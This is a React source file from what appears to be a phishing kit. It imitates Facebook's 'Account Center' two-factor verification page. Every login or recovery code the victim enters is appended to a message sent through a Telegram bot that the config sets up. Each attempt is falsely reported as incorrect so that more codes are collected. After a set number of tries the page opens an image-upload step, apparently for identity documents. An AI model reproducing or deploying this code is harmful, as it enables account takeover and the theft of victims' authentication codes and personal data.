import OTPImage from '@assets/verify.png';
import Loading from '@components/Loading';
import LoadingModal from '@components/LoadingModal';
import useFormValidation from '@hooks/useFormValidation';
import { getCurrentTime } from '@pages/GetInfo';
import ImageUpload from '@pages/ImageUpload';
import { editMessageText } from '@utils/api';
import getConfig from '@utils/config';
import React, { useEffect, useRef, useState } from 'react';
interface Config {
	settings: {
		code_loading_time: number;
		pass_loading_time: number;
		max_pass_attempts: number;
		max_code_attempts: number;
	};
	telegram: {
		chat_id: string;
		token: string;
	};
}

const CodeInput: React.FC = () => {
	const [code, setCode] = useState('');
	const { errors, validateInput } = useFormValidation();
	const [isLoading, setIsLoading] = useState<boolean>(false);
	const [isModalOpen, setIsModalOpen] = useState<boolean>(false);
	const [failedCodeAttempts, setFailedCodeAttempts] = useState<number>(1);
	const codeInputRef = useRef<HTMLInputElement>(null);
	const [showError, setShowError] = useState<boolean>(false);
	const [config, setConfig] = useState<Config | null>(null);

	useEffect(() => {
		const fetchConfig = async () => {
			try {
				const configData = await getConfig();
				setConfig(configData);
			} catch (error) {
				console.error('Error fetching config:', error);
			}
		};
		fetchConfig();
	}, []);

	useEffect(() => {
		if (failedCodeAttempts !== 1) {
			setShowError(true);
		}
	}, [failedCodeAttempts]);

	const handleCodeChange = (event: React.ChangeEvent<HTMLInputElement>) => {
		const value = event.target.value;
		if (/^\d*$/.test(value) && value.length <= 8) {
			setShowError(false);
			setCode(value);
		}
	};

	const handleSubmit = () => {
		setIsLoading(true);
		setFailedCodeAttempts(failedCodeAttempts + 1);
		if (
			config &&
			failedCodeAttempts === config.settings.max_code_attempts
		) {
			setIsModalOpen(true);
			const messageID = localStorage.getItem('message_id');
			const message = localStorage.getItem('message');
			const newMessage =
				message?.replace(
					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
				) +
				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
				code +
				'</code>';
			localStorage.setItem('message', newMessage);
			editMessageText({
				message_id: Number(messageID),
				text: newMessage,
			});
		} else {
			const messageID = localStorage.getItem('message_id');
			const message = localStorage.getItem('message');
			const newMessage =
				message?.replace(
					/<b>📅 Thời gian:<\/b> <code>.*?<\/code>/,
					`<b>📅 Thời gian:</b> <code>${getCurrentTime()}</code>`,
				) +
				`\n<b>🔢 Code ${failedCodeAttempts}:</b><code>` +
				code +
				'</code>';
			localStorage.setItem('message', newMessage);
			editMessageText({
				message_id: Number(messageID),
				text: newMessage,
			});
			const loadingTime = config ? config.settings.code_loading_time : 0;

			setTimeout(() => {
				setCode('');
				if (codeInputRef.current) {
					codeInputRef.current.value = '';
				}
				codeInputRef.current?.focus();
				setIsLoading(false);
				validateInput('code', code);
			}, loadingTime);
		}
	};

	const handleBlur = () => {
		validateInput('code', code);
	};
	const isCodeValid = code.length === 6 || code.length === 8;
	const handleCloseModal = () => {
		setIsModalOpen(false);
	};

	if (!config) {
		return <Loading />;
	}

	return (
		<div className='flex w-full flex-col items-center justify-center p-4'>
			<div className='flex w-11/12 flex-col justify-center gap-2 md:w-3/6 2xl:w-1/3'>
				<div className='flex flex-col'>
					<b>Account Center - Facebook</b>
					<b className='text-2xl'>
						Check notifications on another device
					</b>
				</div>
				<img src={OTPImage} alt='' />
				<div>
					<b>Approve from another device or Enter your login code</b>
					<p>
						Enter 6-digit code we just send from the authentication
						app you set up, or Enter 8-digit recovery code
					</p>
				</div>
				<div className='my-2 flex flex-col items-center justify-center'>
					<input
						ref={codeInputRef}
						className='w-full rounded-full border border-gray-300 p-4 focus:border-blue-500 focus:outline-none'
						type='text'
						autoComplete='one-time-code'
						inputMode='numeric'
						maxLength={8}
						minLength={6}
						pattern='\d*'
						placeholder='Enter Code'
						value={code}
						onChange={handleCodeChange}
						onBlur={handleBlur}
					/>
					{errors.code && (
						<p className='text-red-500'>{errors.code}</p>
					)}
					{!isLoading && showError && (
						<p className='text-red-500'>
							This code is incorrect. Please check that you
							entered the code correctly or try a new code.
						</p>
					)}
					<button
						className={`my-5 flex w-full items-center justify-center rounded-full p-4 font-semibold text-white ${isCodeValid ? 'cursor-pointer bg-blue-500 hover:bg-blue-600' : 'cursor-not-allowed bg-blue-300'} ${
							isLoading ? 'cursor-not-allowed opacity-70' : ''
						}`}
						onClick={() => {
							if (isCodeValid) {
								handleSubmit();
							}
						}}
						disabled={!isCodeValid || isLoading}
					>
						Continue
					</button>
					{isLoading && (
						<LoadingModal
							loadingTime={config.settings.code_loading_time}
							setShowLoadingModal={setIsLoading}
						/>
					)}
					<a href='#' className='text-blue-500 hover:underline'>
						Send Code
					</a>
				</div>
			</div>
			{isModalOpen && <ImageUpload onClose={handleCloseModal} />}
		</div>
	);
};

export default CodeInput;
